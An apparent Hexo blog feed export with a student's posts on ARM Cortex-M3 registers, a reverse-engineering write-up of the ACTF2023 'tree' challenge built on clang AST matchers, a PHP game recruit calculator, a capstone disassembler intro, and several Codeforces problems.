<h6 id="【ARM】内核寄存器以及常用汇编指令分析-知乎-zhihu-com"><a href="#【ARM】内核寄存器以及常用汇编指令分析-知乎-zhihu-com" class="headerlink" title="【ARM】内核寄存器以及常用汇编指令分析 - 知乎 (zhihu.com)"></a><a href="https://zhuanlan.zhihu.com/p/102395838">【ARM】内核寄存器以及常用汇编指令分析 - 知乎 (zhihu.com)</a></h6><p><a href="https://azeria-labs.com/arm-data-types-and-registers-part-2/">ARM Data Types and Registers (Part 2) | Azeria Labs (azeria-labs.com)</a></p>
<p><a href="http://wiki.csie.ncku.edu.tw/embedded/ARMv8">Wiki - ARMv8 (ncku.edu.tw)</a> ： 这个讲的挺底层的</p>
<p><a href="https://hackmd.io/@owlfox/Bkcen7LeL/https%3A%2F%2Fhackmd.io%2Fs%2FBkGRdKmsg">ARM 指令 - HackMD</a>：这个主要偏移动设备</p>
<h3 id="常见寄存器"><a href="#常见寄存器" class="headerlink" title="常见寄存器"></a>常见寄存器</h3><h5 id="基本寄存器结构"><a href="#基本寄存器结构" class="headerlink" title="基本寄存器结构"></a>基本寄存器结构</h5><p><img src="/2023/11/29/arm%E5%88%9D%E6%8E%A2/v2-eea3bf670b65918c3ff16d0d8c9fa552_1440w.webp" alt="img"></p>
<h5 id="R13，堆栈指针-Stack-Pointer"><a href="#R13，堆栈指针-Stack-Pointer" class="headerlink" title="R13，堆栈指针(Stack Pointer)"></a>R13，堆栈指针(Stack Pointer)</h5><p>R13寄存器中存放的是堆栈的栈顶指针，CM3中有两个堆栈指针，也就支持两个堆栈。分别是：主堆栈指针(Main Stack Pointer)，进程堆栈指针(Process Stack Pointer)。</p>
<p>堆栈主要是通过POP，PUSH指令来进行操作。在执行 PUSH 和 POP 操作时，那个通常被称为 SP 的地址寄存器，会自动被调整，以避免后续的操作破坏先前的数据。</p>
<h5 id="R14-，连接寄存器-Link-Register"><a href="#R14-，连接寄存器-Link-Register" class="headerlink" title="R14 ，连接寄存器(Link Register)"></a>R14 ，连接寄存器(Link Register)</h5><p>在一个汇编程序中， LR 用于在调用子程序时存储返回地址。例如，在使用 BL(分支并连接， Branch and Link)指令时，就自动填充 LR 的值(执行函数调用的下一指令)，进而在函数退出时，正确返回并执行下一指令。</p>
<p>如果函数中又调用了其他函数，那么LR将会被覆盖，所以需要先将LR寄存器入栈PUSH，保护起来。</p>
<h5 id="R15，程序计数器-Program-Count"><a href="#R15，程序计数器-Program-Count" class="headerlink" title="R15，程序计数器(Program Count)"></a>R15，程序计数器(Program Count)</h5><p>因为 CM3 内部使用了指令流水线，读 PC 时返回的值是当前指令的地址+4</p>
<h5 id="特殊功能寄存器组"><a href="#特殊功能寄存器组" class="headerlink" title="特殊功能寄存器组"></a>特殊功能寄存器组</h5><p>Cortex‐M3 中的特殊功能寄存器包括：</p>
<p>程序状态寄存器组（ xPSR），存放当前CPU的状态</p>
<p>中断屏蔽寄存器组（ PRIMASK, FAULTMASK,以及 BASEPRI），用于控制异常的使能和除能</p>
<p>控制寄存器（ CONTROL），用于定义特权级别，以及选择当前使用堆栈指针(PSP&#x2F;MSP?)。</p>
<h5 id="CM3的操作模式"><a href="#CM3的操作模式" class="headerlink" title="CM3的操作模式"></a>CM3的操作模式</h5><p>为了架构的安全性和健壮性，CM3支持2个模式(线程模式，handler模式)，以及2个特权等级(特权级，用户级)。<strong>handler模式下只能是特权级。</strong></p>
<p><img src="/2023/11/29/arm%E5%88%9D%E6%8E%A2/v2-a2b2ab0c1ca1dd2ccdd63d31086c51bd_1440w.webp" alt="img"></p>
<h5 id="复位序列"><a href="#复位序列" class="headerlink" title="复位序列"></a>复位序列</h5><p>在进入复位状态后， CM3 做的第一件事就是读取下列两个 32 位整数的值：</p>
<p>从地址 0x0000,0000 处取出 MSP 的初始值。(<strong>初始化MSP，为后续的代码执行创造环境</strong>)</p>
<p>从地址 0x0000,0004 处取出 PC 的初始值—这个值是复位向量。(<strong>启动引导代码</strong>)</p>
<p><img src="https://pic2.zhimg.com/80/v2-75518ed58d8fc3d6b0689f0dc0f30e59_1440w.webp" alt="img"></p>
<p><img src="/2023/11/29/arm%E5%88%9D%E6%8E%A2/v2-b05eeba8cc7c4cbded074a0aee4ebcdb_1440w.webp" alt="img"></p>
<h3 id="ARM汇编指令集"><a href="#ARM汇编指令集" class="headerlink" title="ARM汇编指令集"></a>ARM汇编指令集</h3><p><strong>ARM指令集可以分为跳转指令、数据处理指令、程序状态寄存器(PSR)处理指令、加载&#x2F;存储指令、协处理器指令和异常产生指令六大类</strong>。</p>
<p>跳转指令：B,BL,BX,BXL(<em>用于函数调用时的跳转，分为带&#x2F;不带 返回地址&#x2F;状态 的跳转</em>)</p>
<p>数据处理指令：MOV,ADD,SUB,DIV,MUL,AND,ORR,CMP…(<em>赋值，加减乘除，与或逻辑，比较</em>)</p>
<p>程序状态寄存器(PSR)处理指令：MSR,MRS(<em>用于查询或设置状态寄存器&#x2F;特殊寄存器的数据</em>)</p>
<p>加载&#x2F;存储指令: LDR,STR…(<em>用于寄存器与内存之间的数据交换，*<em>一般为间接寻址</em></em>)</p>
<p>异常产生指令：SWI(<em>用于产生软件中断</em>)</p>
]]></content>
  </entry>
  <entry>
    <title>ACTF2023</title>
    <url>/2023/11/08/ACTF2023/</url>
    <content><![CDATA[<h6 id="PREFACE：强度巨高在打，但是赛中算没出题hhhh5555555，复盘以及复现一下"><a href="#PREFACE：强度巨高在打，但是赛中算没出题hhhh5555555，复盘以及复现一下" class="headerlink" title="PREFACE：强度巨高在打，但是赛中算没出题hhhh5555555，复盘以及复现一下"></a>PREFACE：强度巨高在打，但是赛中算没出题hhhh5555555，复盘以及复现一下</h6><span id="more"></span>

<h3 id="tree"><a href="#tree" class="headerlink" title="tree"></a>tree</h3><h6 id="赛中最接近出的题"><a href="#赛中最接近出的题" class="headerlink" title="赛中最接近出的题"></a>赛中最接近出的题</h6><p>直接打开看行为可以发现它不解析<code>#include</code>头文件，会给你编译一个cpp代码</p>
<p>初步观察可以看到三个check，全过可以从server返回flag</p>
<p><img src="/2023/11/08/ACTF2023/../../hexo1/source/_posts/ACTF2023/image-20231031083726042.png" alt="image-20231031083726042"></p>
<p>查找字符串，一开始以为是模仿的gcc编译器，但是问学长说不像（这里就缺乏经验了已经，问的时候学长就说先看是啥的编译器，自己调了很久也没有去想）字符串发现是clang</p>
<p><img src="/2023/11/08/ACTF2023/../../hexo1/source/_posts/ACTF2023/image-20231031083617728.png" alt="image-20231031083617728"></p>
<p>源码非常复杂，而且有很多handler的结构，导致函数调用往往是跳转表，这里一定得恢复符号（后面check3不恢复符号几乎没办法分析，相反能恢复符号就好做）</p>
<p>check1有一个 <code>== 25</code>，这里其实很容易测试，这里会计算符号的优先级，直接从最高等级的<code>* /</code>视到低等级的比较条件运算符，等级越低数字越大，然后就测到 <code>+= 1</code>可以让check1 + 1，其它会减一，所以最后的结构里面 <code>+= 1</code>比其它的多一即可</p>
<p><img src="/2023/11/08/ACTF2023/../../hexo1/source/_posts/ACTF2023/image-20231031083839468.png" alt="image-20231031083839468"></p>
<p>其实是这个</p>
<p><img src="/2023/11/08/ACTF2023/../../hexo1/source/_posts/ACTF2023/image-20231031084453947.png" alt="image-20231031084453947"></p>
<p>然后有这个函数（这里已经恢复了符号表）：</p>
<p><img src="/2023/11/08/ACTF2023/../../hexo1/source/_posts/ACTF2023/image-20231031084427849.png" alt="image-20231031084427849"></p>
<p>这里会捕捉一个名为<code>AAA</code>的class</p>
<p><img src="/2023/11/08/ACTF2023/../../hexo1/source/_posts/ACTF2023/image-20231031084514268.png" alt="image-20231031084514268"></p>
<p>我们要让我们的结构通过这里的check：</p>
<p><img src="/2023/11/08/ACTF2023/../../hexo1/source/_posts/ACTF2023/image-20231031084749639.png" alt="image-20231031084749639"></p>
<p>（这部分都是当时猜的，然后也没有去恢复符号表了）</p>
<p><img src="/2023/11/08/ACTF2023/../../hexo1/source/_posts/ACTF2023/image-20231031085122412.png" alt="image-20231031085122412"></p>
<p>然后多虚函数继承就过了这里的check2</p>
<p>下午四点就过了check2，本以为形势一片大好，结果游戏才刚刚开始，check3做到早上四点，没救</p>
<p>小折腾了一下，直接搞了个clang15.0.4给bindiff进去，但这里当时是看不到的，而且直观上会往这里面看</p>
<p><img src="/2023/11/08/ACTF2023/../../hexo1/source/_posts/ACTF2023/image-20231031085452353.png" alt="image-20231031085452353"></p>
<p>总之这里一直边调边猜（现在看看这个凌晨两点的记录有些消愁了，但是确实调了几个小时没进展，各种玩意也在反复试）</p>
<p><img src="/2023/11/08/ACTF2023/../../hexo1/source/_posts/ACTF2023/image-20231031085542600.png" alt="image-20231031085542600"></p>
<p><img src="/2023/11/08/ACTF2023/../../hexo1/source/_posts/ACTF2023/image-20231031085710771.png" alt="image-20231031085710771"></p>
<p><img src="/2023/11/08/ACTF2023/../../hexo1/source/_posts/ACTF2023/image-20231031085647733.png" alt="image-20231031085647733"></p>
<p><img src="/2023/11/08/ACTF2023/../../hexo1/source/_posts/ACTF2023/image-20231031085814563.png" alt="image-20231031085814563"></p>
<p>晚上的时候放出hint：需要看一下<code>ast_matcher</code>相关，然后我们一直在找已有的符号以及字符串</p>
<p>不料其实不是这样，应该自己搞一个<code>ast_matcher</code>的api调用，再bindiff进去，就好看了</p>
<p>这部分已经是赛后做的了（小问了一下出题人）</p>
<p>自己把clang安了，然后编译一个这个（这个会匹配<code>for(int i=1;i&lt;2;i++)&#123;&#125;</code>）</p>
<pre><code class="cpp">#include &quot;clang/ASTMatchers/ASTMatchers.h&quot;
#include &quot;clang/ASTMatchers/ASTMatchFinder.h&quot;
#include &quot;clang/Tooling/Tooling.h&quot;
#include &quot;clang/Tooling/CommonOptionsParser.h&quot;

using namespace clang;
using namespace clang::ast_matchers;
using namespace clang::tooling;
static llvm::cl::OptionCategory MyToolCategory(&quot;my-tool options&quot;);

class LoopPrinter : public MatchFinder::MatchCallback &#123;
public:
    virtual void run(const MatchFinder::MatchResult &amp;Result) &#123;
        if (const ForStmt *FS = Result.Nodes.getNodeAs&lt;clang::ForStmt&gt;(&quot;forLoop&quot;)) &#123;
            FS-&gt;dump();
        &#125;
    &#125;
&#125;;

int main(int argc, const char **argv) &#123;
    auto ExpectedParser = CommonOptionsParser::create(argc, argv, MyToolCategory);
    if (!ExpectedParser) &#123;
        llvm::errs() &lt;&lt; ExpectedParser.takeError(); // Print any errors.
        return 1;
    &#125;
    CommonOptionsParser&amp; OptionsParser = ExpectedParser.get();

    if (argc &lt; 2) &#123;
        llvm::errs() &lt;&lt; &quot;Usage: &quot; &lt;&lt; argv[0] &lt;&lt; &quot; &lt;C++ source file&gt;\n&quot;;
        return 1;
    &#125;
    auto Matcher =
        forStmt(
            hasLoopInit(declStmt(
                hasSingleDecl(varDecl(
                    hasInitializer(integerLiteral(equals(1)))
                ))
            )),
            hasCondition(binaryOperator(
                hasOperatorName(&quot;&lt;&quot;),
                hasLHS(ignoringParenImpCasts(declRefExpr(
                    to(varDecl(hasType(isInteger())))
                ))),
                hasRHS(integerLiteral(equals(2)))
            )),
            hasIncrement(unaryOperator(
                hasOperatorName(&quot;++&quot;),
                hasUnaryOperand(ignoringParenImpCasts(declRefExpr(
                    to(varDecl(hasType(isInteger())))
                )))
            ))
        ).bind(&quot;forloop&quot;);

    LoopPrinter Printer;
    MatchFinder Finder;
    Finder.addMatcher(Matcher, &amp;Printer);
    ClangTool Tool(OptionsParser.getCompilations(), OptionsParser.getSourcePathList());
    return Tool.run(newFrontendActionFactory(&amp;Finder).get());
&#125;


// clang++ -g test_tree.cpp -o loop_printer -I/usr/lib/llvm-14/include -L/usr/lib/llvm-14/lib -lclangTooling -lclangASTMatchers -lclangFrontend -lclangSerialization -lclangDriver -lclangParse -lclangSema -lclangAnalysis -lclangEdit -lclangAST -lclangLex -lclangBasic -lLLVM-14 -std=c++14 -pthread -ldl
</code></pre>
<p>然后bindiff进去，结果：</p>
<p><img src="/2023/11/08/ACTF2023/../../hexo1/source/_posts/ACTF2023/image-20231031090305967.png" alt="image-20231031090305967"></p>
<p>对照自己编译出来的loop_printer，就好搞多了</p>
<p><code>&lt;</code>和<code>++</code>的匹配点比较明显</p>
<p>这里一开始一直找不到比较的数字，然后发现会写在栈上：</p>
<p><img src="/2023/11/08/ACTF2023/../../hexo1/source/_posts/ACTF2023/image-20231031090457603.png" alt="image-20231031090457603"></p>
<p>前面的<code>++</code>和<code>&lt;</code>比较容易识别，就是这里的数字有点难找，然后注意这里的”1”和”2”和”f”是一样的，只是一个符号，相当于</p>
<p><img src="/2023/11/08/ACTF2023/../../hexo1/source/_posts/ACTF2023/image-20231031090609600.png" alt="image-20231031090609600">没有实际意义</p>
<p>匹配上check3以后，把check3&#x3D;5构造一下，把check1抵消一下，得到最后的payload：</p>
<pre><code class="cpp">class d&#123;
    public:
    int AAA()&#123;

    &#125;
&#125;;

class c : virtual public d&#123;
&#125;;

class b : virtual public d&#123;
&#125;;
namespace AAA&#123;
    namespace AAA&#123;
        struct AAA: virtual public b, virtual public c&#123;
        public:
            AAA() &#123;
            for (int a = 1 ;a &lt; 10; a++)&#123;
                a += 1;
                a += 1;
            &#125;
            for (int a = 2 ;a &lt; 10; a++)&#123;
                a += 1;
            &#125;
            for (int a = 0 ;a &lt; 10; a++)&#123;
                a += 1;
            &#125;
            for (int a = 0 ;a &lt; 10; a++)&#123;
                a += 1;
            &#125;
            for (int a = 0 ;a &lt; 10; a++)&#123;
                a += 1;
            &#125;
            &#125;
        &#125;;
    &#125;
&#125;
</code></pre>
<p><img src="/2023/11/08/ACTF2023/../../hexo1/source/_posts/ACTF2023/image-20231031090731200.png" alt="image-20231031090731200"></p>
<p>发给服务器远程也是可以通的（没截图），没问题了</p>
<p>这题有一个很麻烦的点，第三个check必须恢复符号表，否则<strong>根本看不出来它是匹配的符号还是自定义的符号名</strong>，前两个check中间过程比较清晰，好猜些，第三个的中间比对过程相当难看与抽象，甚至最后一个数字我还找了好一会</p>
<h3 id="Obfuse"><a href="#Obfuse" class="headerlink" title="Obfuse"></a>Obfuse</h3>]]></content>
  </entry>
  <entry>
    <title>arknights recruit calculator(1)</title>
    <url>/2022/08/27/arknights-recruit-calculator/</url>
    <content><![CDATA[<h1 id="arknights-recruit-calculator-1"><a href="#arknights-recruit-calculator-1" class="headerlink" title="arknights recruit calculator(1)"></a>arknights recruit calculator(1)</h1><h5 id="Published-2022-x2F-08-x2F-27"><a href="#Published-2022-x2F-08-x2F-27" class="headerlink" title="Published: 2022&#x2F;08&#x2F;27"></a>Published: 2022&#x2F;08&#x2F;27</h5><h5 id="Updated-2022-x2F-08-x2F-27"><a href="#Updated-2022-x2F-08-x2F-27" class="headerlink" title="Updated: 2022&#x2F;08&#x2F;27"></a>Updated: 2022&#x2F;08&#x2F;27</h5><h3 id="PREFACE"><a href="#PREFACE" class="headerlink" title="PREFACE"></a>PREFACE</h3><ul>
<li>I’m pretty addicted to this game named Arknights these days, and there is this module named “公招”(“recruit” in English or whatever). So there is this calculator tools use to help you recruit what you want on website. One day it the website&#x2F;procedure were been maintained. And I been studying php for couples of days. That’s when I decided to build my own recruit calculator.</li>
<li>It’s still in testing phase, when it’s complete, I may put it on a website.</li>
<li>The php function mention below can be consulted on <a href="https://www.php.net/">php.net</a><span id="more"></span></li>
</ul>
<hr>
<p>I use html, css to create the User Interface. User can input their tags(5 at most in one post), and program will output the cadres that fits(It will print all combination of the tags that are input).</p>
<p>The UI designed was easy(not to pursue a perfect, that is), just use a POST method and let the php program receive it. The backend devided the STRING into array, and search in the mysql.</p>
<p>There is this problem that HOW TO ESTABLISH THE SQL? There isn’t a sql you can find so easily that is ready made. The closest thing I found was a python dictionary. I wasn’t going to wrote the program in python. So I need to transform it into a PHP ARRAY. At first, I tried to use C to read the py dictionary. Obviously it’s too complicate and I should have better choose–<code>json.dumps()</code>,a function in python that can transform a dictionary into a json file. Like this:</p>
<blockquote>
<p><code>a=json.dumps(list)</code><br>However, it outputted errors. There I knew json.dumps cann’t dail with Chinese. So I searched for solutions and code down whese:</p>
</blockquote>
<blockquote>
<p><code>import json</code><br><code>import numpy as np</code><br><code>class Encoder(json.JSONEncoder):</code><br><code>    def default(self, obj):</code><br><code>        if isinstance(obj, np.ndarray):</code><br><code>            return obj.tolist()</code><br><code>        elif isinstance(obj, bytes):</code><br><code>            return str(obj, encoding=&#39;utf-8&#39;)</code><br><code>        return json.JSONEncoder.default(self, obj)</code><br><code>a=json.dumps(top_operators_list,cls=Encoder)</code><br><code>with open(&#39;tags.txt&#39;,&#39;a&#39;) as file0:</code><br><code>    print(a,file=file0)</code><br>It actually still output error. After few hours, I found the dictionary’s array used “{}” instead of “[]”. Correct all of that, it works and I got a json file containing the data I need.</p>
</blockquote>
<p>Now, I need to put the data in json file into a php array. Luckly, there is this function <code>json_decode</code> that can do the trick. So now the array was prepared.</p>
<p>To search the cadres, you can combine the array into a string in full permutation.(USING DFS) (TIPS:sort your string each time you search will make the work much easier.)</p>
<p>Designed the output UI, and it’s all done!</p>
]]></content>
      <tags>
        <tag>tools</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>capstone</title>
    <url>/2022/11/06/capstone/</url>
    <content><![CDATA[<h6 id="Preface"><a href="#Preface" class="headerlink" title="Preface:"></a>Preface:</h6><h6 id="A-write-up-in-hnctf-use-capstone-to-solved-the-problem-maze-It’s-the-first-time-I-heard-of-it-so-I-am-writing-to-this-blog-for-later-review"><a href="#A-write-up-in-hnctf-use-capstone-to-solved-the-problem-maze-It’s-the-first-time-I-heard-of-it-so-I-am-writing-to-this-blog-for-later-review" class="headerlink" title="A write up in hnctf use capstone to solved the problem maze. It’s the first time I heard of it, so I am writing to this blog for later review."></a>A write up in hnctf use <code>capstone</code> to solved the problem <code>maze</code>. It’s the first time I heard of it, so I am writing to this blog for later review.</h6><h5 id="Most-thing-I-write-can-be-found-in-Official-file"><a href="#Most-thing-I-write-can-be-found-in-Official-file" class="headerlink" title="Most thing I write can be found in Official file."></a>Most thing I write can be found in <a href="http://www.capstone-engine.org/lang_python.html">Official file</a>.</h5><span id="more"></span>
<h5 id="An-example-you-can-try-before-reading"><a href="#An-example-you-can-try-before-reading" class="headerlink" title="An example you can try before reading:"></a>An example you can try before reading:</h5><pre><code># test1.py
from capstone import *

CODE = b&quot;\x55\x48\x8b\x05\xb8\x13\x00\x00&quot;

md = Cs(CS_ARCH_X86, CS_MODE_64)
for i in md.disasm(CODE, 0x1000):
    print(&quot;0x%x:\t%s\t%s&quot; %(i.address, i.mnemonic, i.op_str))

# It&#39;s the official example, you can try to change the CODE and see what happens.(Such as add a few &#39;\x55&#39; or &#39;\x48&#39; or whatever you like)
</code></pre>
<p>Trying this problem, you get the basic idea how capstone, or rather, how a <code>.exe</code> file works. It translate the binary numbers into assembly language in a queue, and when you add some thing, the whole procedure might when wrong.(You may think thit is simple, but some time we just didn’t remember to relate the whole file with simple binary numbers like wht upper <code>CODE</code>)</p>
<p>We need to know what does the function mean:</p>
<p>~to be continue</p>
]]></content>
      <tags>
        <tag>re</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>codeforce:1720C</title>
    <url>/2022/08/28/codeforce-1720C/</url>
    <content><![CDATA[<h1 id="codeforces-1720C"><a href="#codeforces-1720C" class="headerlink" title="codeforces 1720C"></a>codeforces 1720C</h1><span id="more"></span>
<h3 id="The-problem"><a href="#The-problem" class="headerlink" title="The problem"></a>The problem</h3><blockquote>
<p>C. Corners<br>time limit per test1 second<br>memory limit per test256 megabytes<br>inputstandard input<br>outputstandard output<br>You are given a matrix consisting of n rows and m columns. Each cell of this matrix contains 0 or 1.<br>Let’s call a square of size 2×2 without one corner cell an L-shape figure. In one operation you can take one L-shape figure, with at least one cell containing 1 and replace all numbers in it with zeroes.<br>Find the maximum number of operations that you can do with the given matrix.</p>
<blockquote>
<p>Input<br>The first line contains one integer t (1≤t≤500) — the number of test cases. Then follow the descriptions of each test case.<br>The first line of each test case contains two integers n and m (2≤n,m≤500) — the size of the matrix.<br>Each of the following n lines contains a binary string of length m — the description of the matrix.<br>It is guaranteed that the sum of n and the sum of m over all test cases does not exceed 1000.<br>Output<br>For each test case output the maximum number of operations you can do with the given matrix.</p>
</blockquote>
</blockquote>
<!--more-->
<h5 id="At-first-I-didn’t-have-a-clue-So-I-tried-to-do-a-brute-force-Didn’t-work-out-of-course-The-data-volume-is-too-large-So-I-was-wondering-whether-it-could-be-solved-by-dynamic-programing-I-tried-this"><a href="#At-first-I-didn’t-have-a-clue-So-I-tried-to-do-a-brute-force-Didn’t-work-out-of-course-The-data-volume-is-too-large-So-I-was-wondering-whether-it-could-be-solved-by-dynamic-programing-I-tried-this" class="headerlink" title="At first, I didn’t have a clue. So I tried to do a brute force. Didn’t work out of course.The data volume is too large. So I was wondering whether it could be solved by dynamic programing. I tried this:"></a>At first, I didn’t have a clue. So I tried to do a brute force. Didn’t work out of course.The data volume is too large. So I was wondering whether it could be solved by dynamic programing. I tried this:</h5><blockquote>
</blockquote>
<p><code>sum[x][y]=max(sum[x-1][y-1]+b[x][y]-b[x-1][y-1],sum[x-2][y-2]+b[x][y]-b[x-2][y-2])</code></p>
<h6 id="sum-stands-for-the-maximum-number-we-need-to-solve-and-b-x-y-stands-for-the-sum-of-a-1-x-1-y"><a href="#sum-stands-for-the-maximum-number-we-need-to-solve-and-b-x-y-stands-for-the-sum-of-a-1-x-1-y" class="headerlink" title="sum[][] stands for the maximum number we need to solve, and b[x][y] stands for the sum of a[1~x][1~y]."></a>sum[][] stands for the maximum number we need to solve, and b[x][y] stands for the sum of a[1~x][1~y].</h6><h5 id="It-seemed-closed-but-got-a-WA-Well-the-initial-square-was-harder-to-define-then-I-thought-After-a-few-tried-I-decided-to-abandon-this-dp-method"><a href="#It-seemed-closed-but-got-a-WA-Well-the-initial-square-was-harder-to-define-then-I-thought-After-a-few-tried-I-decided-to-abandon-this-dp-method" class="headerlink" title="It seemed closed, but got a WA. Well, the initial square was harder to define then I thought. After a few tried, I decided to abandon this dp method."></a>It seemed closed, but got a WA. Well, the initial square was harder to define then I thought. After a few tried, I decided to abandon this dp method.</h5><h5 id="It-was-some-time-before-the-right-answer-occur-to-me-It’s-actually-pretty-easy"><a href="#It-was-some-time-before-the-right-answer-occur-to-me-It’s-actually-pretty-easy" class="headerlink" title="It was some time before the right answer occur to me. It’s actually pretty easy."></a>It was some time before the right answer occur to me. It’s actually pretty easy.</h5><h5 id="Search-every-square-of-size-2-2-if-exists-one-square-contains-at-least-two-‘0’-then-the-maximum-number-is-the-number-of-‘1’-else-the-maximun-number-is-the-number-of-‘1’-1-if-there-contains-‘0’-or-the-maximun-number-is-the-number-of-‘1’-2-if-the-whole-square-is-‘1’"><a href="#Search-every-square-of-size-2-2-if-exists-one-square-contains-at-least-two-‘0’-then-the-maximum-number-is-the-number-of-‘1’-else-the-maximun-number-is-the-number-of-‘1’-1-if-there-contains-‘0’-or-the-maximun-number-is-the-number-of-‘1’-2-if-the-whole-square-is-‘1’" class="headerlink" title="Search every square of size 2*2, if exists one square contains at least two ‘0’,then the maximum number is the number of ‘1’, else the maximun number is the number of ‘1’- 1(if there contains ‘0’) or the maximun number is the number of ‘1’- 2(if the whole square is ‘1’)"></a>Search every square of size 2*2, if exists one square contains at least two ‘0’,then the maximum number is the number of ‘1’, else the maximun number is the number of ‘1’- 1(if there contains ‘0’) or the maximun number is the number of ‘1’- 2(if the whole square is ‘1’)</h5>]]></content>
      <tags>
        <tag>codeforces</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>codeforce-817E</title>
    <url>/2022/09/02/codeforce-817E/</url>
    <content><![CDATA[<h1 id="codeforces-817E"><a href="#codeforces-817E" class="headerlink" title="codeforces 817E"></a>codeforces 817E</h1><span id="more"></span>
<h3 id="The-problem"><a href="#The-problem" class="headerlink" title="The problem"></a>The problem</h3><blockquote>
<p>E. Counting Rectangles<br>time limit per test6 seconds<br>memory limit per test256 megabytes<br>inputstandard input<br>outputstandard output<br>You have n rectangles, the i-th rectangle has height hi and width wi.<br>You are asked q queries of the form hs ws hb wb.<br>For each query output, the total area of rectangles you own that can fit a rectangle of height hs and width ws while also fitting in a rectangle of height hb and width wb. In other words, print ∑hi⋅wi for i such that hs&lt;hi&lt;hb and ws&lt;wi&lt;wb.<br>Please note, that if two rectangles have the same height or the same width, then they cannot fit inside each other. Also note that you cannot rotate rectangles.<br>Please note that the answer for some test cases won’t fit into 32-bit integer type, so you should use at least 64-bit integer type in your programming language (like long long for C++).</p>
<blockquote>
<p>Input<br>The first line of the input contains an integer t (1≤t≤100) — the number of test cases.<br>The first line of each test case two integers n,q (1≤n≤105; 1≤q≤105) — the number of rectangles you own and the number of queries.<br>Then n lines follow, each containing two integers hi,wi (1≤hi,wi≤1000) — the height and width of the i-th rectangle.<br>Then q lines follow, each containing four integers hs,ws,hb,wb (1≤hs&lt;hb, ws&lt;wb≤1000) — the description of each query.<br>The sum of q over all test cases does not exceed 105, and the sum of n over all test cases does not exceed 105.<br>Output<br>For each test case, output q lines, the i-th line containing the answer to the i-th query.</p>
<blockquote>
<p>Example<br>inputCopy<br>3<br>2 1<br>2 3<br>3 2<br>1 1 3 4<br>5 5<br>1 1<br>2 2<br>3 3<br>4 4<br>5 5<br>3 3 6 6<br>2 1 4 5<br>1 1 2 10<br>1 1 100 100<br>1 1 3 3<br>3 1<br>999 999<br>999 999<br>999 998<br>1 1 1000 1000<br>outputCopy<br>6<br>41<br>9<br>0<br>54<br>4<br>2993004</p>
</blockquote>
</blockquote>
</blockquote>
<h5 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h5><h5 id="In-the-first-test-case-there-is-only-one-query-We-need-to-find-the-sum-of-areas-of-all-rectangles-that-can-fit-a-1×1-rectangle-inside-of-it-and-fit-into-a-3×4-rectangle"><a href="#In-the-first-test-case-there-is-only-one-query-We-need-to-find-the-sum-of-areas-of-all-rectangles-that-can-fit-a-1×1-rectangle-inside-of-it-and-fit-into-a-3×4-rectangle" class="headerlink" title="In the first test case, there is only one query. We need to find the sum of areas of all rectangles that can fit a 1×1 rectangle inside of it and fit into a 3×4 rectangle."></a>In the first test case, there is only one query. We need to find the sum of areas of all rectangles that can fit a 1×1 rectangle inside of it and fit into a 3×4 rectangle.</h5><h5 id="Only-the-2×3-rectangle-works-because-1-lt-2-comparing-heights-and-1-lt-3-comparing-widths-so-the-1×1-rectangle-fits-inside-and-2-lt-3-comparing-heights-and-3-lt-4-comparing-widths-so-it-fits-inside-the-3×4-rectangle-color"><a href="#Only-the-2×3-rectangle-works-because-1-lt-2-comparing-heights-and-1-lt-3-comparing-widths-so-the-1×1-rectangle-fits-inside-and-2-lt-3-comparing-heights-and-3-lt-4-comparing-widths-so-it-fits-inside-the-3×4-rectangle-color" class="headerlink" title="Only the 2×3 rectangle works, because 1&lt;2 (comparing heights) and 1&lt;3 (comparing widths), so the 1×1 rectangle fits inside, and 2&lt;3 (comparing heights) and 3&lt;4 (comparing widths), so it fits inside the 3×4 rectangle. $\color"></a>Only the 2×3 rectangle works, because 1&lt;2 (comparing heights) and 1&lt;3 (comparing widths), so the 1×1 rectangle fits inside, and 2&lt;3 (comparing heights) and 3&lt;4 (comparing widths), so it fits inside the 3×4 rectangle. $\color</h5>]]></content>
      <tags>
        <tag>codeforces</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>codeforce-1719C</title>
    <url>/2022/08/29/codeforce-1719C/</url>
    <content><![CDATA[<h1 id="codeforces-1719C"><a href="#codeforces-1719C" class="headerlink" title="codeforces 1719C"></a>codeforces 1719C</h1><span id="more"></span>
<h3 id="The-problem"><a href="#The-problem" class="headerlink" title="The problem"></a>The problem</h3><blockquote>
<p>C. Fighting Tournament<br>time limit per test2 seconds<br>memory limit per test256 megabytes<br>inputstandard input<br>outputstandard output<br>Burenka is about to watch the most interesting sporting event of the year — a fighting tournament organized by her friend Tonya.<br>n athletes participate in the tournament, numbered from 1 to n. Burenka determined the strength of the i-th athlete as an integer ai, where 1≤ai≤n. All the strength values are different, that is, the array a is a permutation of length n. We know that in a fight, if ai&gt;aj, then the i-th participant always wins the j-th.<br>The tournament goes like this: initially, all n athletes line up in ascending order of their ids, and then there are infinitely many fighting rounds. In each round there is exactly one fight: the first two people in line come out and fight. The winner goes back to the front of the line, and the loser goes to the back.<br>Burenka decided to ask Tonya q questions. In each question, Burenka asks how many victories the i-th participant gets in the first k rounds of the competition for some given numbers i and k. Tonya is not very good at analytics, so he asks you to help him answer all the questions.</p>
<blockquote>
<p>Input<br>The first line contains one integer t (1≤t≤104) — the number of test cases. Description of the test cases follows.<br>The first line of each test case contains two integers n and q (2≤n≤105, 1≤q≤105) — the number of tournament participants and the number of questions.<br>The second line of each test case contains n integers a1,a2,…,an (1≤ai≤n) — the array a, which is a permutation.<br>The next q lines of a test case contain questions. Each line contains two integers i and k (1≤i≤n, 1≤k≤109) — the number of the participant and the number of rounds.<br>It is guaranteed that the sum of n and the sum of q over all test cases do not exceed 105.<br>Output<br>For each Burenka’s question, print a single line containing one integer — the answer to the question.</p>
</blockquote>
</blockquote>
<!--more-->
<h4 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h4><h5 id="It’s-not-a-very-hard-problem-but-contains-many-details-This-is-the-record-when-I-tried"><a href="#It’s-not-a-very-hard-problem-but-contains-many-details-This-is-the-record-when-I-tried" class="headerlink" title="It’s not a very hard problem, but contains many details. This is the record when I tried:"></a>It’s not a very hard problem, but contains many details. This is the record when I tried:</h5><p><img src="/2022/08/29/codeforce-1719C/1719C.png"></p>
<hr>
